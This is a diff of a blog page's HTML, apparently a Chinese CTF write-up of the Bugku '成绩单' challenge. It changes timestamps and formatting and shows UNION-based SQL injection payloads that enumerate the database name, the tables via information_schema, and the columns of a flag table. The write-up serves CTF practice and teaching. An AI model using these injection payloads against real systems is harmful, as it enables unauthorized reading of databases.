@@ -122,7 +122,7 @@
 <meta property="og:site_name" content="AbelChe&#39;s Blog">
 <meta property="og:description" content="题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&amp;#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&amp;#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&amp;#39; union selec">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-08-08T02:34:50.044Z">
+<meta property="og:updated_time" content="2018-08-08T06:16:33.231Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WP-Bugku-成绩单">
 <meta name="twitter:description" content="题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&amp;#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&amp;#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&amp;#39; union selec">
@@ -377,7 +377,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-08T10:34:50+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-08T14:16:33+08:00">
                 2018-08-08
               </time>
             
@@ -473,8 +473,8 @@
 <p>进入这道题目 我们先手遍历一遍<code>id=-1&#39; union select 1,2,3,4#</code></p>
 <p>发现有四个表且都有回显</p>
 <p>于是 就开始爆破吧</p>
-<p>通过<code>id=-1&#39; union select 1,2,3,database()#</code>得到数据库名字skctf_flag</p>
-<p>之后通过<code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>得到表名fl4g,sc</p>
+<p>通过<br><code>id=-1&#39; union select 1,2,3,database()#</code>得到数据库名字skctf_flag</p>
+<p>之后通过<br><code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>得到表名fl4g,sc</p>
 <p>很显然我们需要的数据在fl4g这个表里</p>
 <p>接下来我们就要暴字段了</p>
 <p>通过<code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#</code></p>
